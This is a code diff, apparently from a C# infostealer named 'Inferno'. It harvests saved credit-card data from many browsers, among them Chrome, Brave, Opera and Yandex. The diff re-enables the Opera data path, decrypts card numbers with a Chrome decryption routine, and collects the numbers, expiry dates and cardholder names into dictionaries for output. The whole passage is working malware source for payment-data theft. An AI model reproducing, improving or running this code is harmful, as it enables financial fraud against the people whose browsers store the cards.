@@ -22,7 +22,7 @@ namespace Inferno
                 l_a + "Google\\Chrome" + u_s,
                 l_a + "Google(x86)\\Chrome" + u_s,
                 l_a + "Chromium" + u_s,
-               // SCARY BUG // a_a + "Opera Software\\Opera Stable\\Web Data",
+                a_a + "Opera Software\\Opera Stable\\Web Data",
                 l_a + "BraveSoftware\\Brave-Browser" + u_s,
                 l_a + "Epic Privacy Browser" + u_s,
                 l_a + "Amigo" + u_s,
@@ -45,7 +45,7 @@ namespace Inferno
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<string[]> creditcard = new List<string[]>();
+            List<Dictionary<string, string>> creditcards = new List<Dictionary<string, string>>();
             // Database
             string tempCCLocation = "";
 
@@ -82,20 +82,20 @@ namespace Inferno
                         break;
                     }
 
-               
-                    string[] credentials = new string[4]
+
+                    Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        Crypt.decryptChrome(number, browser),
-                        expYear,
-                        expMonth,
-                        Crypt.toUTF8(name)
+                        ["number"] = Crypt.decryptChrome(number, browser),
+                        ["expireYear"] = expYear,
+                        ["expireMonth"] = expMonth,
+                        ["name"] = Crypt.toUTF8(name)
                     };
-                    creditcard.Add(credentials);
+                    creditcards.Add(credentials);
                     continue;
                 }
                 continue;
             }
-            output.creditcards = creditcard;
+            output.creditcards = creditcards;
             core.Exit("Browsers credit cards received", output);
         }
     }
